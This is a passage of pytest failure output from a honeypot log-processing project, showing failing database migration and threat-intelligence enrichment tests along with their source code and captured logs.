                        )
                        progress_callback(metrics)
    
                # Check if we've reached the limit
                if limit and result['records_processed'] >= limit:
                    break
    
            # Final result message
            if dry_run:
                result['message'] = (
                    f"Dry run completed: {result['records_processed']} records analyzed, "
                    f"{result['records_updated']} would be updated, "
                    f"{result['records_skipped']} would be skipped, "
                    f"{result['errors']} errors"
                )
            else:
                result['message'] = (
                    f"Sanitization completed: {result['records_processed']} records processed, "
                    f"{result['records_updated']} updated, "
                    f"{result['records_skipped']} skipped, "
                    f"{result['errors']} errors"
                )
    
        except Exception as e:
            result['error'] = str(e)
            result['message'] = f"Sanitization failed: {e}"
>           raise Exception(f"Sanitization failed: {e}") from e
E           Exception: Sanitization failed: Raw events table does not exist.

/home/speterson/cowrieprocessor/cowrieprocessor/cli/cowrie_db.py:1087: Exception
_____ TestCowrieDatabaseSQLAlchemy2Integration.test_sqlalchemy_20_patterns _____

self = <test_cowrie_db_sqlalchemy2.TestCowrieDatabaseSQLAlchemy2Integration object at 0x7756b44fb7d0>
cowrie_db = <cowrieprocessor.cli.cowrie_db.CowrieDatabase object at 0x7756b29599d0>

    def test_sqlalchemy_20_patterns(self, cowrie_db):
        """Test that SQLAlchemy 2.0 patterns are properly used."""
        # Test that we're using proper SQLAlchemy 2.0 patterns
        engine = cowrie_db._get_engine()
    
        # Test that engine has future=True for SQLAlchemy 2.0 compatibility
>       assert hasattr(engine, 'future')
E       AssertionError: assert False
E        +  where False = hasattr(Engine(sqlite:////tmp/tmp7amtc_0f.db), 'future')

/home/speterson/cowrieprocessor/tests/integration/test_cowrie_db_sqlalchemy2.py:274: AssertionError
__ TestCowrieDatabaseSQLAlchemy2Integration.test_type_annotations_consistency __

self = <test_cowrie_db_sqlalchemy2.TestCowrieDatabaseSQLAlchemy2Integration object at 0x7756b44fbad0>
cowrie_db = <cowrieprocessor.cli.cowrie_db.CowrieDatabase object at 0x7756b29597f0>

    def test_type_annotations_consistency(self, cowrie_db):
        """Test that type annotations are consistent throughout."""
        # Test that all methods return the expected types
        methods_to_test = [
            ('migrate', dict),
            ('validate_schema', dict),
            ('optimize', dict),
            ('check_integrity', dict),
            ('get_files_table_stats', dict),
            ('analyze_data_quality', dict),
            ('repair_data_quality', dict),
            ('backfill_files_table', dict),
            ('sanitize_unicode_in_database', dict),
            ('longtail_migrate', dict),
            ('longtail_rollback', dict),
            ('validate_longtail_schema', dict),
        ]
    
        for method_name, expected_type in methods_to_test:
            method = getattr(cowrie_db, method_name)
    
            # Test with minimal parameters to avoid errors
            if method_name == 'migrate':
                result = method(dry_run=True)
            elif method_name in ['optimize', 'check_integrity']:
                result = method()
            elif method_name in ['analyze_data_quality', 'repair_data_quality', 'backfill_files_table', 'sanitize_unicode_in_database']:
>               result = method(dry_run=True, batch_size=1, limit=1)
E               TypeError: CowrieDatabase.analyze_data_quality() got an unexpected keyword argument 'dry_run'

/home/speterson/cowrieprocessor/tests/integration/test_cowrie_db_sqlalchemy2.py:307: TypeError
----------------------------- Captured stdout call -----------------------------
2025-10-18 17:39:21,932:WARNING:cowrieprocessor.cli.cowrie_db:cowrie_db.py:get_schema_version:Could not get schema version: (sqlite3.OperationalError) no such table: schema_state
[SQL: SELECT value FROM schema_state WHERE key = 'schema_version']
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 17:39:21,933:WARNING:cowrieprocessor.cli.cowrie_db:cowrie_db.py:get_schema_version:Could not get schema version: (sqlite3.OperationalError) no such table: schema_state
[SQL: SELECT value FROM schema_state WHERE key = 'schema_version']
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 17:39:21,935:WARNING:cowrieprocessor.cli.cowrie_db:cowrie_db.py:validate_schema:Could not get session count: (sqlite3.OperationalError) no such table: session_summaries
[SQL: SELECT COUNT(*) FROM session_summaries]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 17:39:21,940:WARNING:cowrieprocessor.cli.cowrie_db:cowrie_db.py:validate_schema:Could not get command count: (sqlite3.OperationalError) no such table: command_stats
[SQL: SELECT count(*) AS count_1 
FROM (SELECT command_stats.id AS command_stats_id, command_stats.session_id AS command_stats_session_id, command_stats.command_normalized AS command_stats_command_normalized, command_stats.occurrences AS command_stats_occurrences, command_stats.first_seen AS command_stats_first_seen, command_stats.last_seen AS command_stats_last_seen, command_stats.high_risk AS command_stats_high_risk 
FROM command_stats) AS anon_1]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 17:39:21,941:WARNING:cowrieprocessor.cli.cowrie_db:cowrie_db.py:validate_schema:Could not get file count: (sqlite3.OperationalError) no such table: session_summaries
[SQL: SELECT COUNT(*) FROM session_summaries WHERE file_downloads > 0]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 17:39:21,967:WARNING:cowrieprocessor.cli.cowrie_db:cowrie_db.py:get_files_table_stats:Could not get files table stats: (sqlite3.OperationalError) no such table: files
[SQL: SELECT COUNT(*) FROM files]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
------------------------------ Captured log call -------------------------------
WARNING  cowrieprocessor.cli.cowrie_db:cowrie_db.py:146 Could not get schema version: (sqlite3.OperationalError) no such table: schema_state
[SQL: SELECT value FROM schema_state WHERE key = 'schema_version']
(Background on this error at: https://sqlalche.me/e/20/e3q8)
WARNING  cowrieprocessor.cli.cowrie_db:cowrie_db.py:146 Could not get schema version: (sqlite3.OperationalError) no such table: schema_state
[SQL: SELECT value FROM schema_state WHERE key = 'schema_version']
(Background on this error at: https://sqlalche.me/e/20/e3q8)
WARNING  cowrieprocessor.cli.cowrie_db:cowrie_db.py:253 Could not get session count: (sqlite3.OperationalError) no such table: session_summaries
[SQL: SELECT COUNT(*) FROM session_summaries]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
WARNING  cowrieprocessor.cli.cowrie_db:cowrie_db.py:262 Could not get command count: (sqlite3.OperationalError) no such table: command_stats
[SQL: SELECT count(*) AS count_1 
FROM (SELECT command_stats.id AS command_stats_id, command_stats.session_id AS command_stats_session_id, command_stats.command_normalized AS command_stats_command_normalized, command_stats.occurrences AS command_stats_occurrences, command_stats.first_seen AS command_stats_first_seen, command_stats.last_seen AS command_stats_last_seen, command_stats.high_risk AS command_stats_high_risk 
FROM command_stats) AS anon_1]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
WARNING  cowrieprocessor.cli.cowrie_db:cowrie_db.py:272 Could not get file count: (sqlite3.OperationalError) no such table: session_summaries
[SQL: SELECT COUNT(*) FROM session_summaries WHERE file_downloads > 0]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
WARNING  cowrieprocessor.cli.cowrie_db:cowrie_db.py:1856 Could not get files table stats: (sqlite3.OperationalError) no such table: files
[SQL: SELECT COUNT(*) FROM files]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
___ TestCowrieDatabaseSQLAlchemy2Integration.test_error_handling_type_safety ___

self = <cowrieprocessor.cli.cowrie_db.CowrieDatabase object at 0x7756b2959670>
batch_size = 0, limit = 0

    def backfill_files_table(self, batch_size: int = 1000, limit: Optional[int] = None) -> Dict[str, Any]:
        """Backfill files table from historical raw_events data.
    
        Args:
            batch_size: Number of records to process in each batch
            limit: Maximum number of events to process (None for all)
    
        Returns:
            Backfill result with statistics
        """
        result: Dict[str, Any] = {
            'events_processed': 0,
            'files_inserted': 0,
            'errors': 0,
            'batches_processed': 0,
            'message': '',  # Add message field
            'error': '',  # Add error field
        }
    
        try:
            # Check if files table exists
            if not self._table_exists('files'):
>               raise Exception("Files table does not exist. Run 'cowrie-db migrate' first.")
E               Exception: Files table does not exist. Run 'cowrie-db migrate' first.

/home/speterson/cowrieprocessor/cowrieprocessor/cli/cowrie_db.py:668: Exception

The above exception was the direct cause of the following exception:

self = <test_cowrie_db_sqlalchemy2.TestCowrieDatabaseSQLAlchemy2Integration object at 0x7756b4510ec0>
cowrie_db = <cowrieprocessor.cli.cowrie_db.CowrieDatabase object at 0x7756b2959670>

    def test_error_handling_type_safety(self, cowrie_db):
        """Test that error handling maintains type safety."""
        # Test error handling with invalid parameters
>       result = cowrie_db.backfill_files_table(batch_size=0, limit=0)

/home/speterson/cowrieprocessor/tests/integration/test_cowrie_db_sqlalchemy2.py:318: 
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 

self = <cowrieprocessor.cli.cowrie_db.CowrieDatabase object at 0x7756b2959670>
batch_size = 0, limit = 0

    def backfill_files_table(self, batch_size: int = 1000, limit: Optional[int] = None) -> Dict[str, Any]:
        """Backfill files table from historical raw_events data.
    
        Args:
            batch_size: Number of records to process in each batch
            limit: Maximum number of events to process (None for all)
    
        Returns:
            Backfill result with statistics
        """
        result: Dict[str, Any] = {
            'events_processed': 0,
            'files_inserted': 0,
            'errors': 0,
            'batches_processed': 0,
            'message': '',  # Add message field
            'error': '',  # Add error field
        }
    
        try:
            # Check if files table exists
            if not self._table_exists('files'):
                raise Exception("Files table does not exist. Run 'cowrie-db migrate' first.")
    
            # Import here to avoid circular imports
            from ..db.json_utils import get_dialect_name_from_engine
            from ..loader.file_processor import create_files_record, extract_file_data
    
            # Get database dialect for query construction
            dialect_name = get_dialect_name_from_engine(self._get_engine())
    
            # Query for file download events using JSON abstraction
            # Handle binary data gracefully by using safer JSON operators and separate connections
            events: list[Any] = []
    
            # Primary query attempt - use a more restrictive approach to avoid binary data
            try:
                with self._get_engine().connect() as conn:
                    if dialect_name == "postgresql":
                        # Use a query that avoids JSON operators that trigger Unicode processing
                        # Instead, use text-based filtering and handle sanitization in Python
                        query = text("""
                            SELECT id, payload::text as payload_text
                            FROM raw_events
                            WHERE payload::text LIKE '%cowrie.session.file_download%'
                              AND payload::text LIKE '%shasum%'
                            ORDER BY id ASC
                        """)
                    else:
                        query = text("""
                            SELECT id, payload as payload_text
                            FROM raw_events
                            WHERE payload LIKE '%cowrie.session.file_download%'
                              AND payload LIKE '%shasum%'
                            ORDER BY id ASC
                        """)
    
                    if limit:
                        query = text(str(query) + f" LIMIT {limit}")
    
                    raw_events = conn.execute(query).fetchall()
    
                    # Process each event to extract valid file download events
                    events = []
    
                    for row in raw_events:
                        try:
                            # Sanitize the payload text before parsing
                            sanitized_payload_text = UnicodeSanitizer.sanitize_json_string(row.payload_text)
                            payload = json.loads(sanitized_payload_text)
    
                            # Check if this is a valid file download event
                            if (
                                payload.get('eventid') == 'cowrie.session.file_download'
                                and payload.get('shasum')
                                and payload.get('shasum') != ''
                                and payload.get('shasum') != 'null'
                            ):
                                events.append(
                                    type('Row', (), {'session_id': payload.get('session'), 'payload': payload})()
                                )
                        except (json.JSONDecodeError, ValueError, AttributeError) as e:
                            logger.debug(f"Skipping invalid JSON payload at id {row.id}: {e}")
                            result['errors'] += 1
                            continue
    
            except Exception as e:
                logger.warning(f"Primary query failed due to binary data: {e}")
    
                # Fallback query attempt - try to get raw data and process it more carefully
                try:
                    logger.info("Attempting fallback query strategy...")
                    with self._get_engine().connect() as conn:
                        if dialect_name == "postgresql":
                            # Get raw payload data as text and process in Python
                            query = text("""
                                SELECT id, payload::text as payload_text
                                FROM raw_events
                                WHERE payload::text LIKE '%cowrie.session.file_download%'
                                ORDER BY id ASC
                            """)
                        else:
                            query = text("""
                                SELECT id, payload as payload_text
                                FROM raw_events
                                WHERE payload LIKE '%cowrie.session.file_download%'
                                ORDER BY id ASC
                            """)
    
                        if limit:
                            query = text(str(query) + f" LIMIT {limit}")
    
                        raw_events = conn.execute(query).fetchall()
    
                        # Process each event with enhanced error handling
                        events = []
    
                        for row in raw_events:
                            try:
                                # Multiple sanitization attempts
                                payload_text = row.payload_text
    
                                # First, try basic Unicode sanitization
                                sanitized = UnicodeSanitizer.sanitize_unicode_string(payload_text, strict=True)
    
                                # Try to parse as JSON
                                try:
                                    payload = json.loads(sanitized)
                                except json.JSONDecodeError:
                                    # Try more aggressive sanitization
                                    sanitized = UnicodeSanitizer.sanitize_json_string(payload_text)
                                    payload = json.loads(sanitized)
    
                                # Check if this is a valid file download event
                                if (
                                    payload.get('eventid') == 'cowrie.session.file_download'
                                    and payload.get('shasum')
                                    and payload.get('shasum') != ''
                                    and payload.get('shasum') != 'null'
                                ):
                                    events.append(
                                        type('Row', (), {'session_id': payload.get('session'), 'payload': payload})()
                                    )
    
                            except Exception as parse_error:
                                logger.debug(f"Skipping corrupted payload at id {row.id}: {parse_error}")
                                result['errors'] += 1
                                continue
    
                except Exception as fallback_error:
                    logger.error(f"Fallback query also failed: {fallback_error}")
                    result['message'] = (
                        "Backfill failed: Unable to process corrupted JSON payloads in raw_events table. "
                        "The data contains Unicode control characters that cannot be processed by PostgreSQL. "
                        "Consider running a data cleanup script or migrating from a clean source."
                    )
                    return result
    
            if not events:
                result['message'] = "No file download events found to backfill"
                return result
    
            # Process events in batches
            batch = []
            for event in events:
                try:
                    # Extract file data (payload is already sanitized and parsed)
                    file_data = extract_file_data(event.payload, event.session_id)
                    if file_data:
                        file_record = create_files_record(file_data)
                        batch.append(file_record)
                        result['events_processed'] += 1
    
                    # Process batch when it reaches batch_size
                    if len(batch) >= batch_size:
                        inserted = self._insert_files_batch(batch)
                        result['files_inserted'] += inserted
                        result['batches_processed'] += 1
                        batch = []
    
                except Exception as e:
                    logger.warning(f"Error processing event: {e}")
                    result['errors'] += 1
    
            # Process remaining batch
            if batch:
                inserted = self._insert_files_batch(batch)
                result['files_inserted'] += inserted
                result['batches_processed'] += 1
    
            result['message'] = (
                f"Backfill completed: {result['files_inserted']} files inserted "
                f"from {result['events_processed']} events"
            )
    
        except Exception as e:
            result['error'] = str(e)
            result['message'] = f"Backfill failed: {e}"
>           raise Exception(f"Backfill failed: {e}") from e
E           Exception: Backfill failed: Files table does not exist. Run 'cowrie-db migrate' first.

/home/speterson/cowrieprocessor/cowrieprocessor/cli/cowrie_db.py:844: Exception
_ TestCowrieDatabaseSQLAlchemy2Integration.test_database_connection_type_safety _

self = <test_cowrie_db_sqlalchemy2.TestCowrieDatabaseSQLAlchemy2Integration object at 0x7756b4511160>
cowrie_db = <cowrieprocessor.cli.cowrie_db.CowrieDatabase object at 0x7756b2972150>

    def test_database_connection_type_safety(self, cowrie_db):
        """Test that database connections maintain type safety."""
        engine = cowrie_db._get_engine()
    
        # Test that engine connection returns proper types
        with engine.connect() as conn:
            assert conn is not None
    
            # Test that we can execute queries without type errors
>           result = conn.execute(cowrie_db._get_engine().dialect.do_ping(conn))

/home/speterson/cowrieprocessor/tests/integration/test_cowrie_db_sqlalchemy2.py:338: 
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 

self = <sqlalchemy.dialects.sqlite.pysqlite.SQLiteDialect_pysqlite object at 0x7756b2760190>
dbapi_connection = <sqlalchemy.engine.base.Connection object at 0x7756b26f3bd0>

    def do_ping(self, dbapi_connection: DBAPIConnection) -> bool:
>       cursor = dbapi_connection.cursor()
E       AttributeError: 'Connection' object has no attribute 'cursor'

/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/default.py:750: AttributeError
_ TestSQLAlchemy20CompatibilityIntegration.test_no_deprecated_patterns_in_code _

self = <test_cowrie_db_sqlalchemy2.TestSQLAlchemy20CompatibilityIntegration object at 0x7756b467b750>

    def test_no_deprecated_patterns_in_code(self):
        """Test that no deprecated SQLAlchemy patterns are used in the code."""
        import os
    
        # Read the cowrie_db.py file
        cowrie_db_path = os.path.join(os.path.dirname(__file__), '..', '..', 'cowrieprocessor', 'cli', 'cowrie_db.py')
        with open(cowrie_db_path, 'r') as f:
            content = f.read()
    
        # Check for deprecated patterns
        deprecated_patterns = [
            'session.query(',
            '.query(',
            'session.execute(',
            'session.commit(',
            'session.rollback(',
        ]
    
        for pattern in deprecated_patterns:
>           assert pattern not in content, f"Found deprecated pattern: {pattern}"
E           AssertionError: Found deprecated pattern: session.query(
E           assert 'session.query(' not in '"""Database...    main()\n'
E             
E             'session.query(' is contained here:
E               count'] = session.query(CommandStat).count()
E             ?           ++++++++++++++
E                               except Exception as e:
E                                   logger.warning(f"Could not get command count: {e}")
E                                   result['command_count'] = 0...
E             
E             ...Full output truncated (2550 lines hidden), use '-vv' to show

/home/speterson/cowrieprocessor/tests/integration/test_cowrie_db_sqlalchemy2.py:365: AssertionError
___ TestSQLAlchemy20CompatibilityIntegration.test_proper_connection_patterns ___

self = <test_cowrie_db_sqlalchemy2.TestSQLAlchemy20CompatibilityIntegration object at 0x7756b44da570>

    def test_proper_connection_patterns(self):
        """Test that proper SQLAlchemy 2.0 connection patterns are used."""
        import os
    
        # Read the cowrie_db.py file
        cowrie_db_path = os.path.join(os.path.dirname(__file__), '..', '..', 'cowrieprocessor', 'cli', 'cowrie_db.py')
        with open(cowrie_db_path, 'r') as f:
            content = f.read()
    
        # Check for proper connection patterns
        assert 'with engine.connect() as conn:' in content, "Should use engine.connect() pattern"
>       assert 'with engine.begin() as conn:' in content, "Should use engine.begin() pattern"
E       AssertionError: Should use engine.begin() pattern
E       assert 'with engine.begin() as conn:' in '"""Database management CLI for the Cowrie Processor."""\n\nfrom __future__ import annotations\n\nimport argparse\nimp...mmand\': args.command, \'phase\': \'cli_error\'})\n        sys.exit(1)\n\n\nif __name__ == \'__main__\':\n    main()\n'

/home/speterson/cowrieprocessor/tests/integration/test_cowrie_db_sqlalchemy2.py:431: AssertionError
____________________ test_high_risk_session_full_enrichment ____________________

synthetic_db = PosixPath('/tmp/pytest-of-speterson/pytest-33/test_high_risk_session_full_en0/synthetic.sqlite')
tmp_path = PosixPath('/tmp/pytest-of-speterson/pytest-33/test_high_risk_session_full_en0')

    @pytest.mark.integration
    @pytest.mark.enrichment
    def test_high_risk_session_full_enrichment(synthetic_db: Path, tmp_path: Path) -> None:
        """Verify all enrichment services populate flags for a high-risk session."""
        cache_dir = tmp_path / "cache"
        with OfflineEnrichmentHarness(synthetic_db, cache_dir) as harness:
            sessions = harness.sample_sessions(limit=1)
            assert sessions, "Expected at least one synthetic session"
    
            session_id, src_ip = sessions[0]
            result = harness.evaluate_session(session_id, src_ip, file_hashes=["deadbeefdeadbeefdeadbeefdeadbeef"])
    
            assert set(result.enrichment.keys()) == {"dshield", "urlhaus", "spur", "virustotal"}
            assert result.flags["dshield_flagged"] is True
            assert result.flags["urlhaus_flagged"] is True
            assert result.flags["spur_flagged"] is True
>           assert result.flags["vt_flagged"] is True
E           assert False is True

/home/speterson/cowrieprocessor/tests/integration/test_enrichment_flow.py:94: AssertionError
----------------------------- Captured stdout call -----------------------------
2025-10-18 17:39:22,623:DEBUG:asyncio:selector_events.py:__init__:Using selector: EpollSelector
2025-10-18 17:39:23,468:WARNING:cowrieprocessor.enrichment.virustotal_handler:virustotal_handler.py:_fetch_file_info:VirusTotal API error for deadbeefdeadbeefdeadbeefdeadbeef: ('WrongCredentialsError', 'Wrong API key')
2025-10-18 17:39:23,468:ERROR:cowrieprocessor.enrichment.virustotal_handler:virustotal_handler.py:enrich_file:VirusTotal enrichment failed for deadbeefdeadbeefdeadbeefdeadbeef: ('WrongCredentialsError', 'Wrong API key')
------------------------------ Captured log call -------------------------------
DEBUG    asyncio:selector_events.py:64 Using selector: EpollSelector
WARNING  cowrieprocessor.enrichment.virustotal_handler:virustotal_handler.py:212 VirusTotal API error for deadbeefdeadbeefdeadbeefdeadbeef: ('WrongCredentialsError', 'Wrong API key')
ERROR    cowrieprocessor.enrichment.virustotal_handler:virustotal_handler.py:242 VirusTotal enrichment failed for deadbeefdeadbeefdeadbeefdeadbeef: ('WrongCredentialsError', 'Wrong API key')
_ TestEnrichmentMetadataInReports.test_session_report_includes_enrichment_data _

self = <test_enrichment_integration.TestEnrichmentMetadataInReports object at 0x7756b4526350>
test_database = PosixPath('/tmp/tmp79qwzkh7.sqlite')

    def test_session_report_includes_enrichment_data(self, test_database) -> None:
        """Test that session reports include enrichment metadata."""
        # Insert session with enrichment data
        conn = sqlite3.connect(test_database)
        conn.execute(
            """
            INSERT INTO sessions (session, src_ip, start_time, dshield_asn, dshield_country, spur_data, urlhaus_tags)
            VALUES (?, ?, ?, ?, ?, ?, ?)
        """,
            (
                "enriched_session",
                "192.168.1.100",
                "2025-01-01T10:00:00",
                "AS16509",  # DShield ASN
                "US",  # DShield country
                json.dumps(["AS16509", "Amazon.com, Inc.", "DATACENTER"]),  # SPUR data
                "malware,trojan",  # URLHaus tags
            ),
        )
        conn.commit()
        conn.close()
    
        # Test report generation includes enrichment data
        # This would normally be done by the reporting system
        conn = sqlite3.connect(test_database)
        cursor = conn.execute(
            """
            SELECT * FROM sessions WHERE session = ?
        """,
            ("enriched_session",),
        )
    
>       session = dict(cursor.fetchone())
E       ValueError: dictionary update sequence element #0 has length 16; 2 is required

/home/speterson/cowrieprocessor/tests/integration/test_enrichment_integration.py:287: ValueError
___ TestEnrichmentMetadataInReports.test_file_report_includes_vt_enrichment ____

self = <test_enrichment_integration.TestEnrichmentMetadataInReports object at 0x7756b4526490>
test_database = PosixPath('/tmp/tmpuujb5hsg.sqlite')

    def test_file_report_includes_vt_enrichment(self, test_database) -> None:
        """Test that file reports include VirusTotal enrichment data."""
        # Insert file with VT enrichment data
        conn = sqlite3.connect(test_database)
        conn.execute(
            """
            INSERT INTO files (session, filename, shasum, vt_description,
                             vt_classification, vt_malicious, vt_first_seen)
            VALUES (?, ?, ?, ?, ?, ?, ?)
        """,
            (
                "test_session",
                "malware.exe",
                "d41d8cd98f00b204e9800998ecf8427e",
                "Win32 EXE",  # VT description
                "trojan.generic/malware",  # VT classification
                45,  # VT malicious count
                1677600000,  # VT first seen timestamp
            ),
        )
        conn.commit()
        conn.close()
    
        # Verify VT data is stored correctly
        conn = sqlite3.connect(test_database)
        cursor = conn.execute(
            """
            SELECT * FROM files WHERE shasum = ?
        """,
            ("d41d8cd98f00b204e9800998ecf8427e",),
        )
    
>       file_data = dict(cursor.fetchone())
E       ValueError: dictionary update sequence element #0 has length 12; 2 is required

/home/speterson/cowrieprocessor/tests/integration/test_enrichment_integration.py:328: ValueError
_ TestConcurrentEnrichmentProcessing.test_enrichment_rate_limiting_simulation __

self = <test_enrichment_integration.TestConcurrentEnrichmentProcessing object at 0x7756b4526710>
test_database = PosixPath('/tmp/tmpwrecepdp.sqlite')

    def test_enrichment_rate_limiting_simulation(self, test_database) -> None:
        """Test behavior under rate limiting conditions."""
        session_data = {
            "session": "rate_limit_test",
            "src_ip": "192.168.1.150",
            "start_time": "2025-01-01T10:00:00",
            "commands": ["ls"],
        }
    
        conn = sqlite3.connect(test_database)
        conn.execute(
            """
            INSERT INTO sessions (session, src_ip, start_time, commands)
            VALUES (?, ?, ?, ?)
        """,
            (
                session_data["session"],
                session_data["src_ip"],
                session_data["start_time"],
                json.dumps(session_data["commands"]),
            ),
        )
        conn.commit()
        conn.close()
    
        # Mock rate limiting scenario
        call_count = 0
    
        def rate_limited_dshield(ip_address):
            nonlocal call_count
            call_count += 1
            if call_count <= 4:  # First 4 calls succeed
                return json.loads(get_dshield_response("datacenter"))
            else:  # Subsequent calls are rate limited
                raise Exception("Rate limit exceeded")
    
        with patch('process_cowrie.enrichment_dshield_query', side_effect=rate_limited_dshield):
            # Test that rate limiting is handled gracefully
            from process_cowrie import dshield_query
    
            # First few calls should succeed
            for i in range(3):
>               result = dshield_query("192.168.1.150")

/home/speterson/cowrieprocessor/tests/integration/test_enrichment_integration.py:447: 
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
/home/speterson/cowrieprocessor/process_cowrie.py:1474: in dshield_query
    result = enrichment_dshield_query(
/home/speterson/.local/share/uv/python/cpython-3.13.7-linux-x86_64-gnu/lib/python3.13/unittest/mock.py:1169: in __call__
    return self._mock_call(*args, **kwargs)
/home/speterson/.local/share/uv/python/cpython-3.13.7-linux-x86_64-gnu/lib/python3.13/unittest/mock.py:1173: in _mock_call
    return self._execute_mock_call(*args, **kwargs)
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 

self = <MagicMock name='enrichment_dshield_query' id='131214247180480'>
args = ('192.168.1.150', '')
kwargs = {'cache_base': PosixPath('/mnt/dshield/data/cache/cowrieprocessor'), 'now': <built-in function time>, 'session_factory': <function session at 0x7756b4cb4900>, 'skip_enrich': False, ...}
effect = <function TestConcurrentEnrichmentProcessing.test_enrichment_rate_limiting_simulation.<locals>.rate_limited_dshield at 0x7756b26c9120>

    def _execute_mock_call(self, /, *args, **kwargs):
        # separate from _increment_mock_call so that awaited functions are
        # executed separately from their call, also AsyncMock overrides this method
    
        effect = self.side_effect
        if effect is not None:
            if _is_exception(effect):
                raise effect
            elif not _callable(effect):
                result = next(effect)
                if _is_exception(result):
                    raise result
            else:
>               result = effect(*args, **kwargs)
E               TypeError: TestConcurrentEnrichmentProcessing.test_enrichment_rate_limiting_simulation.<locals>.rate_limited_dshield() got an unexpected keyword argument 'skip_enrich'

/home/speterson/.local/share/uv/python/cpython-3.13.7-linux-x86_64-gnu/lib/python3.13/unittest/mock.py:1234: TypeError
_ TestEnrichmentDataConsistency.test_enrichment_data_persistence_across_calls __

self = <test_enrichment_integration.TestEnrichmentDataConsistency object at 0x7756b4526850>
test_database = PosixPath('/tmp/tmpi5z8nt0n.sqlite')
tmp_path = PosixPath('/tmp/pytest-of-speterson/pytest-33/test_enrichment_data_persisten0')

    def test_enrichment_data_persistence_across_calls(self, test_database, tmp_path) -> None:
        """Test that enrichment data is consistently cached and retrieved."""
        # Create cache directory
        cache_dir = tmp_path / "cache"
        cache_dir.mkdir()
    
        # First call should fetch from API
        from process_cowrie import dshield_query
    
>       result1 = dshield_query("192.168.1.100", cache_base=cache_dir)
E       TypeError: dshield_query() got an unexpected keyword argument 'cache_base'

/home/speterson/cowrieprocessor/tests/integration/test_enrichment_integration.py:467: TypeError
___ TestEnrichmentDataConsistency.test_enrichment_data_isolation_between_ips ___

self = <test_enrichment_integration.TestEnrichmentDataConsistency object at 0x7756b4526990>
test_database = PosixPath('/tmp/tmpcxcm7mkw.sqlite')
tmp_path = PosixPath('/tmp/pytest-of-speterson/pytest-33/test_enrichment_data_isolation0')

    def test_enrichment_data_isolation_between_ips(self, test_database, tmp_path) -> None:
        """Test that different IPs get separate enrichment data."""
        cache_dir = tmp_path / "cache"
        cache_dir.mkdir()
    
        from process_cowrie import dshield_query
    
        # Enrich two different IPs
>       result1 = dshield_query("192.168.1.100", cache_base=cache_dir)
E       TypeError: dshield_query() got an unexpected keyword argument 'cache_base'

/home/speterson/cowrieprocessor/tests/integration/test_enrichment_integration.py:487: TypeError
_____ TestEnrichmentErrorRecovery.test_partial_enrichment_failure_recovery _____

self = <test_enrichment_integration.TestEnrichmentErrorRecovery object at 0x7756b4526ad0>
test_database = PosixPath('/tmp/tmp3t780v2v.sqlite')

    def test_partial_enrichment_failure_recovery(self, test_database) -> None:
        """Test recovery when some enrichment services fail."""
        session_data = {
            "session": "partial_failure_test",
            "src_ip": "192.168.1.175",
            "start_time": "2025-01-01T10:00:00",
            "commands": ["ls", "pwd"],
        }
    
        conn = sqlite3.connect(test_database)
        conn.execute(
            """
            INSERT INTO sessions (session, src_ip, start_time, commands)
            VALUES (?, ?, ?, ?)
        """,
            (
                session_data["session"],
                session_data["src_ip"],
                session_data["start_time"],
                json.dumps(session_data["commands"]),
            ),
        )
        conn.commit()
        conn.close()
    
        # Mock partial failure scenario
        with (
            patch('process_cowrie.enrichment_dshield_query') as mock_dshield,
            patch('process_cowrie.enrichment_read_spur_data') as mock_spur,
        ):
            # DShield succeeds, SPUR fails
            mock_dshield.return_value = json.loads(get_dshield_response("datacenter"))
            mock_spur.side_effect = Exception("SPUR API unavailable")
    
            from process_cowrie import dshield_query, read_spur_data
    
            # DShield should work
            dshield_result = dshield_query("192.168.1.175")
            assert dshield_result["ip"]["asname"] == "AMAZON-02"
    
            # SPUR should fail gracefully
>           spur_result = read_spur_data("192.168.1.175", "test-key")
E           TypeError: read_spur_data() takes 1 positional argument but 2 were given

/home/speterson/cowrieprocessor/tests/integration/test_enrichment_integration.py:543: TypeError
----------------------------- Captured stdout call -----------------------------
2025-10-18 17:39:28,805:DEBUG:root:process_cowrie.py:db_commit:Database transaction committed
------------------------------ Captured log call -------------------------------
DEBUG    root:process_cowrie.py:867 Database transaction committed
____ TestEnrichmentErrorRecovery.test_complete_enrichment_failure_recovery _____

self = <test_enrichment_integration.TestEnrichmentErrorRecovery object at 0x7756b4526c10>
test_database = PosixPath('/tmp/tmpdykqfkt2.sqlite')

    def test_complete_enrichment_failure_recovery(self, test_database) -> None:
        """Test recovery when all enrichment services fail."""
        session_data = {
            "session": "complete_failure_test",
            "src_ip": "192.168.1.180",
            "start_time": "2025-01-01T10:00:00",
            "commands": ["whoami"],
        }
    
        conn = sqlite3.connect(test_database)
        conn.execute(
            """
            INSERT INTO sessions (session, src_ip, start_time, commands)
            VALUES (?, ?, ?, ?)
        """,
            (
                session_data["session"],
                session_data["src_ip"],
                session_data["start_time"],
                json.dumps(session_data["commands"]),
            ),
        )
        conn.commit()
        conn.close()
    
        # Mock complete failure scenario
        with (
            patch('process_cowrie.enrichment_dshield_query') as mock_dshield,
            patch('process_cowrie.enrichment_read_spur_data') as mock_spur,
            patch('process_cowrie.enrichment_safe_read_uh_data') as mock_urlhaus,
        ):
            # All services fail
            mock_dshield.side_effect = Exception("DShield API down")
            mock_spur.side_effect = Exception("SPUR API down")
            mock_urlhaus.side_effect = Exception("URLHaus API down")
    
